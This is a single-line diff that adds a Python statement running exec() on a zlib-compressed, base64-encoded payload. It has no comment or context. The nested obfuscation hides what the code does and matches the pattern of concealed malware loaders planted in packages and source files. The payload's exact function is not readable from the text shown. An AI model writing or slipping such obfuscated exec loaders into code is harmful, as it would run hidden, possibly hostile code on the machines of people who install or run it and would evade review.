@@ -1,0 +1,1 @@
+exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNqFkMEKgzAMhl+leKow6pTtNHqQ4WCMbTC9y6zdLKtNMfX9Z3XQ3cwhIcmX/CSqtzA4giA+0pHJNt4RHBs7gJCIoQZIDoR0gI5Hba9E+06ZBvHUDpiRLvJdv4zv0n3mE+TLWrYE+svyU32+FdWf2FIv78dLXVaPIr/G8zgTYIwUjlIvGngvEs8IIGtHm1FkL6WlARoHartKpKtENhOWh3ew6V5No6RRJsEuir9xyVqe')[0])))
